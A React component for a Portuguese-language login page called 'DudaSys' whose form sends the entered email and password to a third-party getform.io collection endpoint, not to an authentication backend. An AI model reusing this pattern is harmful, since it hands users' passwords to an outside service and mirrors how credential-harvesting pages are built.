import React from 'react';
import { FaCat } from "react-icons/fa";
import './App.css'; 

function App() {
  return (
    <div className="min-h-screen bg-pink-300 flex flex-col">
      <header className="bg-white w-full p-4 flex items-center justify-center shadow-md">
        <FaCat className="text-purple-700 text-2xl mr-4" />
        <h1 className="font-sans text-2xl font-extrabold text-purple-800">
          DudaSys
        </h1>
        <FaCat className="text-purple-700 text-2xl ml-4" />
      </header>
      <div className="flex-grow flex flex-col items-center justify-center p-4">
        <div className="bg-white p-8 rounded-lg shadow-xl w-full max-w-md">
          <h2 className="text-2xl font-bold text-center text-gray-800 mb-6">Entrar na sua conta</h2>
          <form action="https://getform.io/f/ayvydvgb" method="POST">
            <div className="mb-4">
              <input
                type="text"
                id="username"
                name="username"
                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline focus:border-purple-700"
                placeholder="Digite o email"
              />
            </div>

            <div className="mb-6">
              <input
                type="password"
                id="password"
                name="senha" 
                className="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 mb-3 leading-tight focus:outline-none focus:shadow-outline focus:border-purple-500"
                placeholder="Digite a senha"
              />
            </div>

            <div className="flex items-center justify-between">
              <button
                type="submit"
                className="bg-purple-700 hover:bg-purple-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline w-full focus:border-purple-900"
              >
                Entrar
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}

export default App;
